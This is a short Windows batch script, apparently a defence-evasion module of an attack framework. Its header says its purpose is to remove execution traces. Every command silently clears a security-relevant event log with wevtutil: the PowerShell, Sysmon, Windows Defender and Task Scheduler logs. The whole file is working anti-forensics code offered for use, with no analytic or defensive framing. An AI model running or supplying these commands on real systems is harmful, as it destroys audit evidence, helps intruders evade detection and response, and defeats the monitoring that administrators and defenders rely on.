REM provides: evasion_event_log_clear
REM depends: (none)
REM description: Clear security-relevant event logs to remove execution traces

REM Clear PowerShell logs (requires elevation, fails silently without)
wevtutil cl "Windows PowerShell" >nul 2>nul
wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>nul

REM Clear Sysmon operational log if present
wevtutil cl "Microsoft-Windows-Sysmon/Operational" >nul 2>nul

REM Clear Windows Defender operational log
wevtutil cl "Microsoft-Windows-Windows Defender/Operational" >nul 2>nul

REM Clear task scheduler log
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" >nul 2>nul
